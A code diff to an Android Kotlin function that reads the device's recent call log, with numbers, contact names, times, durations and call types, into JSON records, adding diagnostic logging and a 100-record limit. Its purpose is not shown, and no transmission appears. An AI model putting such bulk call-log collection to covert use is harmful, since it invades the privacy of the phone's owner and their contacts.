@@ -85,31 +85,61 @@ object PhoneManager {
 
     fun getCallLogs(ctx: Context): JSONArray {
         val list = JSONArray()
-        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list
+        val hasPermission = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        
+        if (!hasPermission) {
+            DebugLogger.log("PHONE_DIAG", "Call Log capture failed: Permission READ_CALL_LOG not granted.")
+            return list
+        }
 
         try {
+            // Explicit projection for robustness - query only what we need to prevent memory/cursor errors
+            val projection = arrayOf(
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.CACHED_NAME
+            )
+
             val cursor = ctx.contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
-                null, null, null, CallLog.Calls.DATE + " DESC"
+                projection, 
+                null, 
+                null, 
+                "${CallLog.Calls.DATE} DESC LIMIT 100"
             )
+
             cursor?.use {
+                if (it.count == 0) {
+                    DebugLogger.log("PHONE_DIAG", "Query successful, but device call log is empty.")
+                    return list
+                }
+
                 val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                 val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                 val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                 val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                 
                 var count = 0
-                while(it.moveToNext() && count < 50) {
+                while(it.moveToNext()) {
                     count++
                     val obj = JSONObject()
-                    obj.put("num", it.getString(numIdx))
+                    obj.put("num", it.getString(numIdx) ?: "Private")
+                    obj.put("name", it.getString(nameIdx) ?: "Unknown")
                     obj.put("ts", it.getLong(dateIdx))
                     obj.put("dur", it.getLong(durIdx))
                     obj.put("type", it.getInt(typeIdx))
                     list.put(obj)
                 }
+                DebugLogger.log("PHONE_DIAG", "Successfully captured $count call records.")
+            } ?: run {
+                DebugLogger.log("PHONE_DIAG", "CallLog provider returned null cursor (Database may be locked/busy).")
             }
-        } catch(e: Exception) {}
+        } catch(e: Exception) {
+            DebugLogger.log("PHONE_DIAG", "Fatal query error: ${e.message}")
+        }
         return list
     }
 
